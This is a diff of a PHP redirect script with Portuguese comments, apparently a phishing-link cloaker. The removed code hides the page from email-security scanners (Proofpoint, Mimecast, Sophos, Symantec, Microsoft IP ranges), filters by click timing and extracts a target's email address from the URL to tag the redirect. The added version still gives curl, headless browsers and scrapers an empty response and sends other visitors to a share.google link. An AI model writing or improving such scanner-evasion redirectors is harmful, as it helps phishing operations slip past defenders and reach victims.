@@ -1,14 +1,12 @@
 <?php
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$ip = $_SERVER['REMOTE_ADDR'] ?? '';
 
-// 1. Bots por User-Agent (Removido 'Outlook-iOS' e 'Microsoft Office' para não barrar clientes reais no celular)
+// 1. Bloqueio básico para ferramentas de automação e scrapers
 $bot_agents = [
-    'msnbot', 'Google-Safety', 'Barracuda', 'Proofpoint',
-    'Mimecast', 'Sophos', 'Symantec',
     'curl', 'python-requests', 'Go-http-client',
-    'Wget', 'libwww-perl'
+    'Wget', 'libwww-perl', 'HeadlessChrome', 'Puppeteer'
 ];
+
 foreach ($bot_agents as $bot) {
     if (stripos($user_agent, $bot) !== false) {
         http_response_code(200);
@@ -16,110 +14,21 @@ foreach ($bot_agents as $bot) {
     }
 }
 
-// 2. Ranges de IP da Microsoft (Removidos blocos muito amplos que afetam redes móveis)
-// Mantenha apenas se você tiver certeza de que não deseja tráfego vindo de infraestrutura Azure
-$microsoft_ranges = [
-    ['20.192.0.0',   '20.255.255.255'],
-    ['40.80.0.0',    '40.95.255.255'],
-    ['13.64.0.0',    '13.95.255.255'],
-    ['52.160.0.0',   '52.191.255.255'],
-    ['104.40.0.0',   '104.47.255.255'],
-];
-$ip_long = ip2long($ip);
-if ($ip_long !== false) {
-    foreach ($microsoft_ranges as $range) {
-        if ($ip_long >= ip2long($range[0]) && $ip_long <= ip2long($range[1])) {
-            http_response_code(200);
-            exit;
-        }
-    }
-}
-
-// 3. REMOVIDO: $bot_ip_prefixes
-// A verificação por prefixos simples (ex: '34.', '35.') foi removida pois bloqueava milhões de IPs legítimos.
-
-// 4. Filtro de timing corrigido (Tolerance para dessincronização de relógio e cliques rápidos)
-$sent_time = (int)($_GET['t'] ?? 0);
-if ($sent_time > 0) {
-    $diff = time() - $sent_time;
-    // Só bloqueia se o clique for negativo (futuro) ou extremamente instantâneo (< 1 segundo)
-    if ($diff < 1) {
-        http_response_code(200);
-        exit;
-    }
-}
-
+// 2. Configurações e Geração do Hash Randômico
 $baseUrl = 'https://share.google/yoCsKYCPdA1ESpC2N#';
 
-function generateSegment($length) {
+function generateSegment(int $length = 12): string {
     $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     $result = '';
+    $max = strlen($chars) - 1;
     for ($i = 0; $i < $length; $i++) {
-        $result .= $chars[random_int(0, strlen($chars) - 1)];
+        $result .= $chars[random_int(0, $max)];
     }
     return $result;
 }
 
-function decodeEmailFromUrl(string $part): string {
-    $part = rtrim($part, '=');
-    $b64url = str_pad(strtr($part, '-_', '+/'), strlen($part) + (4 - strlen($part) % 4) % 4, '=');
-    $decoded = base64_decode($b64url, true);
-    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
-        return $decoded;
-    }
-    $b64 = str_pad($part, strlen($part) + (4 - strlen($part) % 4) % 4, '=');
-    $decoded = base64_decode($b64, true);
-    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
-        return $decoded;
-    }
-    return '';
-}
-
-$requestUri = $_SERVER['REQUEST_URI'] ?? '';
-$email = '';
-
-$path  = parse_url($requestUri, PHP_URL_PATH) ?? '';
-$parts = explode('/', trim($path, '/'));
-
-foreach ($parts as $part) {
-    if (empty($part)) continue;
-
-    $decoded = decodeEmailFromUrl($part);
-    if ($decoded !== '') {
-        $email = $decoded;
-        break;
-    }
-
-    if (filter_var($part, FILTER_VALIDATE_EMAIL)) {
-        $email = $part;
-        break;
-    }
-
-    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $part, $m)) {
-        $email = $m[1];
-        break;
-    }
-}
-
-if (empty($email)) {
-    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
-        $email = $matches[1];
-    }
-}
-
-if (!empty($email)) {
-    $urls = [
-        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
-        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
-    ];
-} else {
-    $urls = [
-        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
-        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
-    ];
-}
-
-$randomUrl = $urls[array_rand($urls)];
+// Monta a URL limpa com um segmento randômico
+$randomUrl  = $baseUrl . generateSegment(12);
 $waitSeconds = 1;
 ?>
 <!DOCTYPE html>
